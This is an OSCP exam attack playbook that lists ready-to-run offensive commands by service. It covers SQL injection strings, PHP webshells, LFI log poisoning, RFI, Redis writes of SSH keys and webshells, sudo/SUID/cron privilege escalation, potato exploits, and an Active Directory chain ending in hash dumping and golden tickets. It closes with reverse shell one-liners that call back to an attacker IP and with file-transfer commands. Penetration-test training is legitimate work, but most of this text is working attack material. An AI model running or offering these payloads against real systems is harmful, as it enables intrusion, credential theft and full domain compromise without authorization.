# OSCP Attack Playbook

**Author:** Brad Turner

> ⚠️ **DISCLAIMER:** For authorized security testing only. Do not use against systems without explicit written permission. The author assumes no liability for misuse. You are responsible for compliance with all applicable laws.

Reference guide for common attack scenarios. Use during the exam when you identify specific services or situations.

---

## Table of Contents
1. [Initial Triage Decision Tree](#initial-triage-decision-tree)
2. [Web Application Attacks](#web-application-attacks)
3. [SMB/Windows Attacks](#smbwindows-attacks)
4. [Linux Service Attacks](#linux-service-attacks)
5. [Privilege Escalation Scenarios](#privilege-escalation-scenarios)
6. [Active Directory Attack Flow](#active-directory-attack-flow)
7. [When You're Stuck](#when-youre-stuck)

---

## Initial Triage Decision Tree

After running `oscp-enum.sh`, use this to prioritize:

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         WHAT PORTS ARE OPEN?                                │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  80/443/8080 (HTTP) ──────► Go to: Web Application Attacks                  │
│                                                                             │
│  21 (FTP) ────────────────► Check anonymous login, version exploits         │
│                                                                             │
│  22 (SSH) ────────────────► Usually need creds first, check version         │
│                                                                             │
│  139/445 (SMB) ───────────► Go to: SMB/Windows Attacks                      │
│                                                                             │
│  389/636/3268 (LDAP) ─────► Active Directory - Go to: AD Attack Flow        │
│                                                                             │
│  3306 (MySQL) ────────────► Default creds, UDF exploit if root access       │
│                                                                             │
│  5432 (PostgreSQL) ───────► Default creds, command execution                │
│                                                                             │
│  6379 (Redis) ────────────► No auth? Write SSH key or webshell              │
│                                                                             │
│  27017 (MongoDB) ─────────► No auth? Dump databases                         │
│                                                                             │
│  1433 (MSSQL) ────────────► xp_cmdshell, linked servers                     │
│                                                                             │
│  5985/5986 (WinRM) ───────► evil-winrm with creds                           │
│                                                                             │
│  3389 (RDP) ──────────────► Need creds, bluekeep if old                     │
│                                                                             │
│  2049 (NFS) ──────────────► Check exports, mount and explore                │
│                                                                             │
│  111 (RPC) ───────────────► Enumerate NFS, services                         │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## Web Application Attacks

### Scenario 1: Found a Web Application

**Step 1: Identify the technology**
```bash
# Fingerprint
whatweb http://TARGET
curl -I http://TARGET

# Check response headers for:
# - Server (Apache, nginx, IIS)
# - X-Powered-By (PHP, ASP.NET)
# - Cookies (PHPSESSID, JSESSIONID, ASP.NET_SessionId)
```

**Step 2: Directory/File discovery**
```bash
# Common wordlists
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
gobuster dir -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# If IIS
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x asp,aspx,config

# If found interesting directory, recurse
gobuster dir -u http://TARGET/admin -w /usr/share/wordlists/dirb/common.txt
```

**Step 3: Based on what you find...**

---

### Scenario 2: Login Page Found

```
┌─────────────────────────────────────────────────────────────────┐
│ LOGIN PAGE ATTACK FLOW                                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. Try default credentials first:                              │
│     admin:admin, admin:password, root:root, guest:guest         │
│     admin:Admin123, administrator:administrator                 │
│                                                                 │
│  2. Check for SQL injection:                                    │
│     Username: admin' --                                         │
│     Username: ' OR '1'='1                                       │
│     Username: admin'#                                           │
│                                                                 │
│  3. Check for username enumeration:                             │
│     Different error for valid vs invalid user?                  │
│                                                                 │
│  4. If you have usernames, try:                                 │
│     hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
│                                                                 │
│  5. Check page source for:                                      │
│     - Hidden fields                                             │
│     - Comments with creds                                       │
│     - JavaScript with hardcoded values                          │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

### Scenario 3: File Upload Found

```bash
# Test what's allowed
# 1. Try direct PHP upload
shell.php

# 2. Try extension bypass
shell.php.jpg
shell.pHp
shell.php5
shell.phtml
shell.php%00.jpg    # Null byte (old PHP)

# 3. Try content-type bypass
# Change Content-Type header to: image/jpeg

# 4. Try magic bytes
# Add GIF89a; at start of PHP file
echo 'GIF89a;<?php system($_GET["cmd"]); ?>' > shell.php.gif

# 5. Double extension
shell.jpg.php

# Find upload location
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt | grep -i upload

# Trigger shell
curl "http://TARGET/uploads/shell.php?cmd=id"
```

---

### Scenario 4: LFI/RFI Found

**Local File Inclusion (LFI)**
```bash
# Basic LFI test
http://TARGET/page.php?file=../../../etc/passwd
http://TARGET/page.php?file=....//....//....//etc/passwd

# Windows
http://TARGET/page.php?file=C:\Windows\System32\drivers\etc\hosts
http://TARGET/page.php?file=..\..\..\..\Windows\System32\drivers\etc\hosts

# Useful Linux files to grab:
/etc/passwd                    # Users
/etc/shadow                    # Passwords (if readable)
/home/USER/.ssh/id_rsa        # SSH keys
/var/www/html/config.php      # Web config
/var/log/apache2/access.log   # For log poisoning
/proc/self/environ            # Environment variables

# PHP Wrappers (read source code)
http://TARGET/page.php?file=php://filter/convert.base64-encode/resource=config.php
# Then: echo "BASE64_OUTPUT" | base64 -d

# LFI to RCE via log poisoning
# 1. Inject PHP into User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://TARGET/
# 2. Include the log file
http://TARGET/page.php?file=/var/log/apache2/access.log&cmd=id
```

**Remote File Inclusion (RFI)**
```bash
# Host a shell
echo '<?php system($_GET["cmd"]); ?>' > shell.txt
python3 -m http.server 80

# Include it
http://TARGET/page.php?file=http://YOUR_IP/shell.txt&cmd=id
```

---

### Scenario 5: SQL Injection Found

**Manual Testing**
```bash
# Error-based detection
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' #
" OR "1"="1
') OR ('1'='1

# UNION-based (find column count)
' ORDER BY 1-- 
' ORDER BY 2--
' ORDER BY 3--    # Increase until error

# UNION attack
' UNION SELECT 1,2,3--
' UNION SELECT null,null,null--
' UNION SELECT 1,@@version,3--
' UNION SELECT 1,user(),3--

# Read files (MySQL)
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--

# Write files (MySQL)
' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'--
```

**SQLMap (if manual fails)**
```bash
# Basic
sqlmap -u "http://TARGET/page.php?id=1" --batch

# With cookie/auth
sqlmap -u "http://TARGET/page.php?id=1" --cookie="PHPSESSID=abc123" --batch

# POST request (save request from Burp)
sqlmap -r request.txt --batch

# Dump database
sqlmap -u "http://TARGET/page.php?id=1" --dump --batch

# Get shell
sqlmap -u "http://TARGET/page.php?id=1" --os-shell --batch
```

---

### Scenario 6: WordPress Found

```bash
# Enumerate users
wpscan --url http://TARGET -e u

# Enumerate vulnerable plugins
wpscan --url http://TARGET -e vp

# Brute force (if you have usernames)
wpscan --url http://TARGET -U admin -P /usr/share/wordlists/rockyou.txt

# Check for:
# /wp-admin/               - Admin login
# /wp-content/uploads/     - Uploaded files
# /wp-config.php           - Config (if LFI)
# /xmlrpc.php              - Often vulnerable

# If you get admin access:
# Appearance > Theme Editor > Edit 404.php
# Add: <?php system($_GET['cmd']); ?>
# Access: http://TARGET/wp-content/themes/THEME/404.php?cmd=id
```

---

## SMB/Windows Attacks

### Scenario 7: SMB Open (139/445)

```bash
# Step 1: Version and vulnerability scan
nmap --script smb-vuln* -p 139,445 TARGET

# Step 2: Enumerate shares
smbclient -L //TARGET -N                          # Null session
smbmap -H TARGET                                   # As guest
smbmap -H TARGET -u null -p ''                    # Null session
crackmapexec smb TARGET --shares                  # Quick overview

# Step 3: Connect to shares
smbclient //TARGET/ShareName -N                   # No password
smbclient //TARGET/ShareName -U 'user%password'   # With creds

# Step 4: Download everything from a share
smbget -R smb://TARGET/ShareName -U 'user%pass'
# Or mount it
mount -t cifs //TARGET/ShareName /mnt -o user=guest,password=''

# Step 5: Look for:
# - Credentials in config files
# - Scripts with hardcoded passwords
# - Backup files (.bak, .old)
# - Database files
```

**Common SMB Vulnerabilities**
```bash
# EternalBlue (MS17-010) - Windows 7, Server 2008 R2
nmap --script smb-vuln-ms17-010 -p 445 TARGET
# Exploit: use exploit/windows/smb/ms17_010_eternalblue

# MS08-067 - Windows XP, Server 2003
nmap --script smb-vuln-ms08-067 -p 445 TARGET
# Exploit: use exploit/windows/smb/ms08_067_netapi

# SambaCry (CVE-2017-7494) - Linux Samba
nmap --script smb-vuln-cve-2017-7494 -p 445 TARGET
```

---

### Scenario 8: Got Windows Credentials

```bash
# Verify creds work
crackmapexec smb TARGET -u USER -p 'PASSWORD' -d DOMAIN

# Check what you can access
crackmapexec smb TARGET -u USER -p 'PASSWORD' --shares
crackmapexec smb TARGET -u USER -p 'PASSWORD' -x 'whoami'

# Get shell
# PSExec (creates service, needs admin)
impacket-psexec DOMAIN/USER:'PASSWORD'@TARGET

# WMIExec (no service, stealthier)
impacket-wmiexec DOMAIN/USER:'PASSWORD'@TARGET

# SMBExec (creates service)
impacket-smbexec DOMAIN/USER:'PASSWORD'@TARGET

# WinRM (port 5985)
evil-winrm -i TARGET -u USER -p 'PASSWORD'

# With NTLM hash instead of password
impacket-psexec DOMAIN/USER@TARGET -hashes :NTHASH
crackmapexec smb TARGET -u USER -H NTHASH
evil-winrm -i TARGET -u USER -H NTHASH
```

---

## Linux Service Attacks

### Scenario 9: FTP Open (21)

```bash
# Check anonymous login
ftp TARGET
> Name: anonymous
> Password: (blank or anonymous)

# Nmap scripts
nmap --script ftp-anon,ftp-vuln* -p 21 TARGET

# If anonymous works, look for:
# - Config files
# - Backup files
# - Writable directories (upload shell?)

# Check version for exploits
searchsploit vsftpd
searchsploit proftpd
```

---

### Scenario 10: SSH Open (22)

```bash
# Usually need creds first
# Check version for exploits (rare)
nmap --script ssh2-enum-algos -p 22 TARGET
searchsploit openssh

# If you find credentials
ssh user@TARGET

# If you find SSH key
chmod 600 id_rsa
ssh -i id_rsa user@TARGET

# Brute force (last resort, slow)
hydra -l user -P /usr/share/wordlists/rockyou.txt TARGET ssh
```

---

### Scenario 11: NFS Open (2049)

```bash
# Check exports
showmount -e TARGET

# Mount the share
mkdir /mnt/nfs
mount -t nfs TARGET:/share /mnt/nfs

# Look for:
# - SSH keys
# - Config files with passwords
# - User home directories

# If you can write and export has no_root_squash:
# Create SUID binary on your machine, copy it over
# On Kali (as root):
cp /bin/bash /mnt/nfs/bash_suid
chmod +s /mnt/nfs/bash_suid
# On target:
/share/bash_suid -p
```

---

### Scenario 12: Redis Open (6379)

```bash
# Check if no auth required
redis-cli -h TARGET
> INFO

# If no auth, write SSH key
# On Kali
ssh-keygen -t rsa -f ./redis_key
(echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > payload.txt

# Write to target
redis-cli -h TARGET flushall
cat payload.txt | redis-cli -h TARGET -x set crackit
redis-cli -h TARGET config set dir /root/.ssh/
redis-cli -h TARGET config set dbfilename "authorized_keys"
redis-cli -h TARGET save

# Connect
ssh -i redis_key root@TARGET

# Or write webshell if web server running
redis-cli -h TARGET config set dir /var/www/html/
redis-cli -h TARGET config set dbfilename "shell.php"
redis-cli -h TARGET set payload "<?php system($_GET['cmd']); ?>"
redis-cli -h TARGET save
```

---

## Privilege Escalation Scenarios

### Scenario 13: Linux - Sudo Misconfiguration

```bash
sudo -l
```

**Common exploitable sudo entries:**

| Entry | Exploitation |
|-------|-------------|
| `(ALL) NOPASSWD: /usr/bin/vim` | `sudo vim -c ':!/bin/bash'` |
| `(ALL) NOPASSWD: /usr/bin/find` | `sudo find . -exec /bin/bash \; -quit` |
| `(ALL) NOPASSWD: /usr/bin/python*` | `sudo python -c 'import os; os.system("/bin/bash")'` |
| `(ALL) NOPASSWD: /usr/bin/less` | `sudo less /etc/passwd` then `!/bin/bash` |
| `(ALL) NOPASSWD: /usr/bin/awk` | `sudo awk 'BEGIN {system("/bin/bash")}'` |
| `(ALL) NOPASSWD: /usr/bin/nmap` | `sudo nmap --interactive` then `!sh` (old nmap) |
| `(ALL) NOPASSWD: /bin/bash` | `sudo bash` |
| `(ALL) NOPASSWD: /usr/bin/env` | `sudo env /bin/bash` |
| `(ALL) NOPASSWD: /usr/bin/perl` | `sudo perl -e 'exec "/bin/bash";'` |
| `(ALL) NOPASSWD: /path/to/script.sh` | Check if script is writable or uses relative paths |

**Check GTFOBins: https://gtfobins.github.io/**

---

### Scenario 14: Linux - SUID Binary

```bash
find / -perm -4000 -type f 2>/dev/null
```

**Common exploitable SUID binaries:**

| Binary | Exploitation |
|--------|-------------|
| `/usr/bin/find` | `find . -exec /bin/bash -p \; -quit` |
| `/usr/bin/vim` | `vim -c ':py import os; os.execl("/bin/bash", "bash", "-p")'` |
| `/usr/bin/python*` | `python -c 'import os; os.execl("/bin/bash", "bash", "-p")'` |
| `/usr/bin/nmap` | `nmap --interactive` then `!sh` |
| `/usr/bin/cp` | Copy `/etc/passwd`, add root user, copy back |
| Custom binary | Check with `strings`, `ltrace`, may call other binaries without full path |

**Custom/Unknown SUID binary:**
```bash
# Check what it does
strings /path/to/binary
ltrace /path/to/binary
strace /path/to/binary

# If it calls another binary without full path (e.g., "cat" instead of "/bin/cat")
export PATH=/tmp:$PATH
echo '/bin/bash -p' > /tmp/cat
chmod +x /tmp/cat
/path/to/binary
```

---

### Scenario 15: Linux - Cron Job Exploitation

```bash
# Check cron
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.*

# Check if cron script is writable
ls -la /path/to/cron/script.sh

# If writable, add reverse shell
echo 'bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1' >> /path/to/script.sh

# If script uses relative path
# e.g., cron runs: cd /opt && ./backup.sh
# And backup.sh calls "tar" without full path
echo '/bin/bash -p' > /opt/tar
chmod +x /opt/tar
# Wait for cron
```

---

### Scenario 16: Linux - Writable /etc/passwd

```bash
# Check if writable
ls -la /etc/passwd

# Generate password hash
openssl passwd -1 password123

# Add root user
echo 'hacker:$1$xyz$hashhash:0:0::/root:/bin/bash' >> /etc/passwd

# Switch to new user
su hacker
# Password: password123
```

---

### Scenario 17: Linux - Capabilities

```bash
getcap -r / 2>/dev/null
```

| Capability | Binary | Exploitation |
|------------|--------|-------------|
| `cap_setuid+ep` | python | `python -c 'import os; os.setuid(0); os.system("/bin/bash")'` |
| `cap_setuid+ep` | perl | `perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'` |
| `cap_dac_read_search+ep` | tar | Read any file: `tar -cvf shadow.tar /etc/shadow` |
| `cap_dac_override+ep` | vim | Write any file |

---

### Scenario 18: Windows - SeImpersonatePrivilege

```bash
# Check privileges
whoami /priv
```

If you have `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`:

```powershell
# PrintSpoofer (Windows 10/Server 2016+)
PrintSpoofer64.exe -i -c cmd

# GodPotato (most modern)
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "cmd /c C:\path\to\nc.exe YOUR_IP PORT -e cmd.exe"

# JuicyPotato (older, Server 2016/Windows 10 < 1809)
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c nc.exe YOUR_IP PORT -e cmd.exe" -t *

# RoguePotato
RoguePotato.exe -r YOUR_IP -l 9999 -e "cmd.exe /c nc.exe YOUR_IP PORT -e cmd.exe"
```

---

### Scenario 19: Windows - Unquoted Service Path

```powershell
# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
```

Example vulnerable path: `C:\Program Files\My App\My Service\service.exe`

```powershell
# Windows will try:
# C:\Program.exe
# C:\Program Files\My.exe
# C:\Program Files\My App\My.exe

# If you can write to any of those locations:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > My.exe
# Copy to C:\Program Files\
# Restart service or machine
```

---

### Scenario 20: Windows - Weak Service Permissions

```powershell
# Check service permissions
accesschk64.exe -uwcqv "Everyone" * /accepteula
accesschk64.exe -uwcqv "Authenticated Users" * /accepteula
accesschk64.exe -uwcqv "Users" * /accepteula

# If SERVICE_CHANGE_CONFIG on a service:
sc config SERVICENAME binpath= "C:\path\to\shell.exe"
sc stop SERVICENAME
sc start SERVICENAME
```

---

## Active Directory Attack Flow

### Phase 1: Initial Enumeration (With Provided Creds)

```bash
# Verify creds
crackmapexec smb DC_IP -u USER -p 'PASSWORD' -d DOMAIN

# Dump users
crackmapexec smb DC_IP -u USER -p 'PASSWORD' -d DOMAIN --users > users.txt

# Dump groups
net rpc group members "Domain Admins" -I DC_IP -U "DOMAIN/USER%PASSWORD"

# Get SPNs (Kerberoastable accounts)
impacket-GetUserSPNs DOMAIN/USER:PASSWORD -dc-ip DC_IP -request

# Get AS-REP roastable accounts
impacket-GetNPUsers DOMAIN/ -dc-ip DC_IP -usersfile userlist.txt -format hashcat

# BloodHound collection
bloodhound-python -u USER -p 'PASSWORD' -d DOMAIN -dc DC_IP -c all --zip
```

### Phase 2: Attack Execution

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    AD ATTACK DECISION TREE                                  │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  Got Kerberoast hash? ──────► Crack it: hashcat -m 13100 hash rockyou.txt   │
│                                                                             │
│  Got AS-REP hash? ──────────► Crack it: hashcat -m 18200 hash rockyou.txt   │
│                                                                             │
│  Found password in share? ──► Try it on other users/machines                │
│                                                                             │
│  BloodHound shows path? ────► Follow the attack path                        │
│     - GenericAll on user?        Reset their password                       │
│     - GenericWrite on user?      Set SPN, Kerberoast them                   │
│     - WriteDACL?                 Give yourself rights                       │
│     - AddMember to group?        Add yourself to the group                  │
│                                                                             │
│  Got local admin on client? ─► Dump hashes, pivot to other machines         │
│                                                                             │
│  Got Domain Admin creds? ────► Go to DC, dump everything                    │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Phase 3: Lateral Movement

```bash
# With password
impacket-psexec DOMAIN/USER:'PASSWORD'@TARGET_IP
impacket-wmiexec DOMAIN/USER:'PASSWORD'@TARGET_IP
evil-winrm -i TARGET_IP -u USER -p 'PASSWORD'

# With NTLM hash
impacket-psexec DOMAIN/USER@TARGET_IP -hashes :NTHASH
crackmapexec smb TARGET_IP -u USER -H NTHASH -x 'whoami'
evil-winrm -i TARGET_IP -u USER -H NTHASH

# Check where creds work
crackmapexec smb SUBNET/24 -u USER -p 'PASSWORD' -d DOMAIN
crackmapexec smb SUBNET/24 -u USER -H NTHASH -d DOMAIN
```

### Phase 4: Domain Controller Compromise

```bash
# Dump all hashes from DC
impacket-secretsdump DOMAIN/ADMIN:'PASSWORD'@DC_IP
impacket-secretsdump DOMAIN/ADMIN@DC_IP -hashes :NTHASH

# Get Domain Admin with krbtgt hash (Golden Ticket)
# From secretsdump output, get krbtgt NTLM hash
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx -domain DOMAIN Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass DOMAIN/Administrator@DC_FQDN
```

---

## When You're Stuck

### Checklist: Did You...

```
□ Run full port scan? (not just top 1000)
□ Check UDP ports? (SNMP 161, TFTP 69)
□ Run gobuster with different wordlists?
□ Check for virtual hosts? (gobuster vhost)
□ Read ALL files in accessible shares?
□ Check source code of web pages?
□ Try default credentials?
□ Search for exploits of EXACT versions?
□ Check for config files? (.htaccess, web.config, wp-config.php)
□ Look at ALL user home directories?
□ Check bash_history files?
□ Look for backup files? (.bak, .old, .swp, ~)
□ Check environment variables?
□ Look for credentials in running processes?
□ Check internal services? (127.0.0.1 only)
```

### Common Rabbit Holes to Avoid

1. **Brute forcing SSH** - Usually not the path
2. **Kernel exploits before checking basics** - Try sudo, SUID, cron first
3. **Spending too long on one machine** - Move on, come back later
4. **Ignoring "useless" ports** - UDP, weird high ports matter
5. **Not reading source code** - Comments often have hints
6. **Forgetting about internal services** - Port forward and exploit

### Reset Your Approach

If stuck for 1+ hour:
1. Take a 10-minute break
2. Re-read your notes from scratch
3. Run scans again with different tools/wordlists
4. Try a completely different attack vector
5. Move to another machine

---

## Quick Reference Tables

### Reverse Shell Cheatsheet

| Type | Command |
|------|---------|
| Bash | `bash -i >& /dev/tcp/IP/PORT 0>&1` |
| Python | `python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` |
| PHP | `php -r '$s=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'` |
| Perl | `perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in(PORT,inet_aton("IP")));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'` |
| PowerShell | See README.md |

### Hash Types for Hashcat/John

| Hash Type | Hashcat Mode | Example |
|-----------|-------------|---------|
| NTLM | 1000 | `aad3b435b51404eeaad3b435b51404ee:hash` |
| NTLMv2 | 5600 | `user::domain:challenge:response` |
| Kerberos TGS (Kerberoast) | 13100 | `$krb5tgs$23$*...` |
| AS-REP | 18200 | `$krb5asrep$23$...` |
| MD5 | 0 | 32 hex chars |
| SHA1 | 100 | 40 hex chars |
| SHA256 | 1400 | 64 hex chars |
| bcrypt | 3200 | `$2a$...` or `$2b$...` |
| Linux shadow (SHA512) | 1800 | `$6$salt$hash` |

### File Transfer Methods

| Source → Dest | Method |
|--------------|--------|
| Kali → Linux | `wget http://KALI/file` or `curl http://KALI/file -o file` |
| Kali → Windows | `certutil -urlcache -f http://KALI/file file` |
| Kali → Windows | `powershell -c "(New-Object Net.WebClient).DownloadFile('http://KALI/file','file')"` |
| Kali → Windows | `powershell -c "iwr http://KALI/file -OutFile file"` |
| Windows → Kali | `impacket-smbserver share . -smb2support` then `copy file \\KALI\share\` |
| Linux → Kali | `nc KALI PORT < file` (on Kali: `nc -lvnp PORT > file`) |

---

*Last updated: December 2024*
*Good luck on the exam!*

